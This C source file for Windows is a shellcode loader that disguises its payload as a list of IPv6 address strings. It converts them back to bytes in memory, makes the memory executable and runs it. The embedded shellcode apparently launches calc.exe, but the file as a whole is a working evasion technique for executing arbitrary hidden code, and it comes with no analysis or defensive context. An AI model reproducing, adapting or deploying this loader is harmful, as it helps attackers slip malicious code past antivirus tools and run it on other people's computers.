#include <Windows.h>
#include <ip2string.h>
#include <In6addr.h>

const PSTR ipv6_payload[] = {
	"9990:9b90:9b9f:f89b:9f91:9093:fc48:83e4",
	"f0e8:c000:0:4151:4150:5251:5648:31d2",
	"6548:8b52:6048:8b52:1848:8b52:2048:8b72",
	"5048:fb7:4a4a:4d31:c948:31c0:ac3c:617c",
	"22c:2041:c1c9:d41:1c1:e2ed:5241:5148",
	"8b52:208b:423c:4801:d08b:8088:0:48",
	"85c0:7467:4801:d050:8b48:1844:8b40:2049",
	"1d0:e356:48ff:c941:8b34:8848:1d6:4d31",
	"c948:31c0:ac41:c1c9:d41:1c1:38e0:75f1",
	"4c03:4c24:845:39d1:75d8:5844:8b40:2449",
	"1d0:6641:8b0c:4844:8b40:1c49:1d0:418b",
	"488:4801:d041:5841:585e:595a:4158:4159",
	"415a:4883:ec20:4152:ffe0:5841:595a:488b",
	"12e9:57ff:ffff:5d48:ba01::",
	"48:8d8d:101:0:41ba:318b:6f87:ffd5",
	"bbf0:b5a2:5641:baa6:95bd:9dff:d548:83c4",
	"283c:67c:a80:fbe0:7505:bb47:1372:6f6a",
	"59:4189:daff:d563:616c:632e:6578:6500",
};

#define array_len sizeof(ipv6_payload) / sizeof(PCSTR)
#define payload_size array_len * 16

typedef VOID PAYLOAD(VOID);

INT main(VOID) {
	PBYTE payload_buff;
	IN6_ADDR addr;
	PSTR term;
	DWORD old_protection;

	payload_buff = VirtualAlloc(
		NULL,
		payload_size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);

	for (DWORD i = 0; i < array_len; i++) {
		RtlIpv6StringToAddressA(ipv6_payload[i], &term, &addr);
		CopyMemory(payload_buff + i * sizeof(addr), &addr, sizeof(addr));
	}

	if ( ! VirtualProtect(payload_buff, payload_size, PAGE_EXECUTE_READ, &old_protection) ) {
		puts("VirtualProtect failed");
		return 1;
	}

	PAYLOAD* fn_payload = (PAYLOAD*)payload_buff;

	fn_payload();

	return 0;
}